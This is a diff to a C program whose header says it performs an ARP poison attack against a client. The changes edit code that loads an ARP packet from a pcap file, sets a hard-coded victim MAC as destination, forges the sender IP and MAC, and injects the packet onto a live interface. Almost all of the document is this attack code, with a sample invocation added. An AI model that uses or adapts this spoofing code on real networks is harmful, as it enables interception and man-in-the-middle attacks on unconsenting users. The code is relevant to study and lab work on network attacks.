@@ -8,6 +8,8 @@ Author: Joseph Rocha <JosephRocha.CS@gmail.com>
 Purpose: This program performs a ARP poison attack
          against a client.
 
+Sample Invocation:
+  ./HighCastle -i <interface> -v <victim_mac>
 **************************************************/
 #include <stdio.h>
 #include <stdlib.h>
@@ -32,7 +34,6 @@ typedef struct arphdr{
 }arphdr_t;
 
 int main(int argc, char **argv) {
-    srand(time(NULL));
     char *device; /* Name of device (e.g. eth0, wlan0) */
     char error_buffer[PCAP_ERRBUF_SIZE]; /* Size defined in pcap.h */
     pcap_t *handle;
@@ -40,37 +41,39 @@ int main(int argc, char **argv) {
     const u_char *packet;
     bpf_u_int32 subnet_mask, ip;
     struct pcap_pkthdr packet_header;
-    int packet_count_limit = 10000;
-    int timeout_limit = 10000; /* In milliseconds */
+    struct arphdr* arp_header;
+    struct addr ip_address;
+    eth_addr_t ether_address;
 
     /* Find a device */
     device = "eno1";//pcap_lookupdev(error_buffer);
     pcap_lookupnet(device, &ip, &subnet_mask, error_buffer);
 
     /* Open device for live capture */
-    handle = pcap_open_live(device, BUFSIZ, packet_count_limit, timeout_limit, error_buffer);
+    handle = pcap_open_live(device, BUFSIZ, 1, 10000, error_buffer);
+
+    /* Open second device to read from file and read*/
     handle2 = pcap_open_offline("arp.pcap", error_buffer);
     packet = pcap_next(handle2, &packet_header);
-    struct arphdr* arp_header = (struct arphdr*) (packet + sizeof(struct ether_header));
-    struct addr sa;
-    eth_addr_t ether_address;
-
-    // Set destination (ethernet) as the client we are attacking.
+    arp_header = (struct arphdr*) (packet + sizeof(struct ether_header));
+    // Set destination (ethernet) as the victim we are attacking.
     struct ether_header* eth_header = (struct ether_header*) packet;
     eth_pton("94:c6:91:a0:90:26", &ether_address);
     memcpy(&eth_header->ether_dhost, &ether_address, ETH_ADDR_LEN);
 
-    //Insert this record into the ARP table.
-    inet_pton(AF_INET, "10.10.22.22", &(sa.addr_ip));
-    memcpy(&arp_header->spa, &sa.addr_ip, IP_ADDR_LEN);
-    eth_pton("de:ad:be:ef:de:ad", &ether_address);
+    //Insert this record into the victim's ARP table.
+    inet_pton(AF_INET, "10.10.22.22", &(ip_address.addr_ip));
+    memcpy(&arp_header->spa, &ip_address.addr_ip, IP_ADDR_LEN);
+    eth_pton("94:c6:91:a0:91:8d", &ether_address);
     memcpy(&arp_header->sha, &ether_address, ETH_ADDR_LEN);
 
-    //Set Target IP and MAC?
-    inet_pton(AF_INET, "10.10.22.23", &(sa.addr_ip));
-    memcpy(&arp_header->tpa, &sa.addr_ip, IP_ADDR_LEN);
-    eth_pton("94:c6:91:a0:90:26", &ether_address);
+    //Eh do I need this?
+    inet_pton(AF_INET, "0.0.0.0", &(ip_address.addr_ip));
+    memcpy(&arp_header->tpa, &ip_address.addr_ip, IP_ADDR_LEN);
+    eth_pton("00:00:00:00:00:00", &ether_address);
     memcpy(&arp_header->tha, &ether_address, ETH_ADDR_LEN);
+
+    //Inject!
     pcap_inject(handle, packet, packet_header.len);
     return 0;
 }
